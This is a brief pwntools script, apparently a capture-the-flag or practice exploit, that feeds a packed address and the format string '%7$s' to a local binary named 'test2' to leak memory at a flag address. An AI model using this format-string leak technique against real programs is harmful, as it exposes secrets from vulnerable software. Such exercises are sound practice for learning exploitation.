from pwn import *
p=process('./test2')

flag_address=0x80485a0

p.sendline(p32(flag_address)+'%7$s')
ret=p.recvline(keepends=False)[-8:]
log.info('precious: ' + ret)

